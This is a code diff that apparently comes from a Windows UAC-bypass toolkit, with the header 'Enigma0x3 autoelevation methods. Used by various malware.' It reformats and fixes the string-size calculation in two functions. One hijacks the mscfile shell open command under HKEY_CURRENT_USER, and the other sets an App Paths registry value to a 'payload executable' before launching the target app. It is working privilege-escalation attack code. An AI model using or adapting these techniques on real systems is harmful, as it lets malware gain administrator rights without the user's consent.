@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.70
 *
-*  DATE:        25 Mar 2017
+*  DATE:        01 May 2017
 *
 *  Enigma0x3 autoelevation methods.
 *  Used by various malware.
@@ -84,14 +84,28 @@ BOOL ucmHijackShellCommandMethod(
             _strcat(lpBuffer, L",WdsInitialize");
         }
 
-        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
-            L"Software\\Classes\\mscfile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+        lResult = RegCreateKeyEx(
+            HKEY_CURRENT_USER,
+            L"Software\\Classes\\mscfile\\shell\\open\\command",
+            0,
+            NULL,
+            REG_OPTION_NON_VOLATILE,
+            MAXIMUM_ALLOWED,
+            NULL,
+            &hKey,
+            NULL);
 
         if (lResult != ERROR_SUCCESS)
             break;
 
-        lResult = RegSetValueEx(hKey, L"", 0, REG_SZ, (BYTE*)lpBuffer,
-            (DWORD)(_strlen(lpBuffer) * sizeof(WCHAR)));
+        sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
+        lResult = RegSetValueEx(
+            hKey,
+            L"",
+            0,
+            REG_SZ,
+            (BYTE*)lpBuffer,
+            (DWORD)sz);
 
         if (lResult != ERROR_SUCCESS)
             break;
@@ -374,8 +388,14 @@ BOOL ucmAppPathMethod(
         // Set default value as our payload executable.
         //
         if (lResult == ERROR_SUCCESS) {
-            lResult = RegSetValueEx(hKey, L"", 0, REG_SZ, (BYTE*)lpBuffer,
-                (DWORD)(_strlen(lpBuffer) * sizeof(WCHAR)));
+            sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
+            lResult = RegSetValueEx(
+                hKey,
+                L"",
+                0,
+                REG_SZ,
+                (BYTE*)lpBuffer,
+                (DWORD)sz);
 
             //
             // Finally run target app.
